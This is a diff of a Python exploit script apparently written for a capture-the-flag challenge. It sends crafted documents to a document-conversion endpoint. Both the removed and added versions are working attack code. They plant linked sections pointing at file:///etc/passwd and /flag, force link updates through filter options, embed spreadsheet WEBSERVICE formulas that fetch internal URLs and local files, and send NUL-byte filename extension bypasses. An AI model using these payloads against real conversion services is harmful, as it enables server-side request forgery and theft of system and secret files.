@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-"""Temporary CTF ODT type-detection and link-update probe."""
+"""Temporary CTF spreadsheet-formula and filename probe."""
+import html
 import io
 import pathlib
 import urllib.error
@@ -11,32 +12,16 @@ BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
 POC = pathlib.Path(__file__).with_name("poc.odt")
 
 
-def payload(target):
-    out = io.BytesIO()
-    with zipfile.ZipFile(POC) as zin, zipfile.ZipFile(out, "w") as zout:
-        for info in zin.infolist():
-            data = zin.read(info.filename)
-            if info.filename == "content.xml":
-                data = data.replace(b"file:///etc/passwd", b"file://" + target.encode())
-                data = data.replace(b"<text:section", b"<text:p>ARENA_MARKER</text:p><text:section", 1)
-            zout.writestr(info, data)
-    return out.getvalue()
-
-
-def convert(filename, target, fields=None):
-    data = payload(target)
+def send(data, filename, fmt, label):
     boundary = "----Arena" + uuid.uuid4().hex
-    prefix = b""
-    for name, value in (fields or {}).items():
-        prefix += f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode()
-    body = prefix + (
+    body = (
         f"--{boundary}\r\n"
         f'Content-Disposition: form-data; name="data"; filename="{filename}"\r\n'
         "Content-Type: application/octet-stream\r\n\r\n"
     ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
-    req = urllib.request.Request(BASE + "/cool/convert-to/txt", data=body, method="POST")
+    req = urllib.request.Request(BASE + "/cool/convert-to/" + fmt, data=body, method="POST")
     req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
-    print("\n=== CONVERT", filename, target, fields, flush=True)
+    print("\n===", label, "FILENAME_REPR", repr(filename), flush=True)
     try:
         with urllib.request.urlopen(req, timeout=90) as r:
             raw = r.read(500000)
@@ -47,9 +32,47 @@ def convert(filename, target, fields=None):
         print("ERROR", repr(e), flush=True)
 
 
-convert("probe.odt", "/etc/passwd")
-convert("probe.txt", "/etc/passwd")
-convert("probe.txt", "/etc/passwd", {"infilterOptions": "UpdateDocMode=1"})
-convert("probe.txt", "/etc/passwd", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
-convert("probe.odt", "/etc/passwd", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
-convert("probe.txt", "/flag", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
+def formula_ods(formula):
+    content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" office:version="1.2">
+<office:body><office:spreadsheet><table:table table:name="Sheet1"><table:table-row>
+<table:table-cell table:formula="of:={html.escape(formula, quote=True)}" office:value-type="string"><text:p></text:p></table:table-cell>
+</table:table-row></table:table></office:spreadsheet></office:body></office:document-content>'''
+    manifest = '''<?xml version="1.0" encoding="UTF-8"?>
+<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
+<manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/>
+<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
+</manifest:manifest>'''
+    out = io.BytesIO()
+    with zipfile.ZipFile(out, "w") as z:
+        z.writestr("mimetype", "application/vnd.oasis.opendocument.spreadsheet", compress_type=zipfile.ZIP_STORED)
+        z.writestr("content.xml", content, compress_type=zipfile.ZIP_DEFLATED)
+        z.writestr("META-INF/manifest.xml", manifest, compress_type=zipfile.ZIP_DEFLATED)
+    return out.getvalue()
+
+
+def marked_odt():
+    out = io.BytesIO()
+    with zipfile.ZipFile(POC) as zin, zipfile.ZipFile(out, "w") as zout:
+        for info in zin.infolist():
+            data = zin.read(info.filename)
+            if info.filename == "content.xml":
+                data = data.replace(b"<text:section", b"<text:p>ARENA_MARKER</text:p><text:section", 1)
+            zout.writestr(info, data)
+    return out.getvalue()
+
+
+for formula in (
+    'INFO("release")',
+    'CELL("FILENAME")',
+    'WEBSERVICE("http://webapp:8000/")',
+    'WEBSERVICE("http://webapp:8000/flag")',
+    'WEBSERVICE("http://webapp:8000/internal/flag")',
+    'WEBSERVICE("file:///etc/passwd")',
+    'WEBSERVICE("file:///flag")',
+):
+    send(formula_ods(formula), "formula.ods", "csv", formula)
+
+odt = marked_odt()
+for filename in ("probe.odt\x00.txt", "probe.odt%00.txt"):
+    send(odt, filename, "txt", "NUL_EXTENSION_BYPASS")
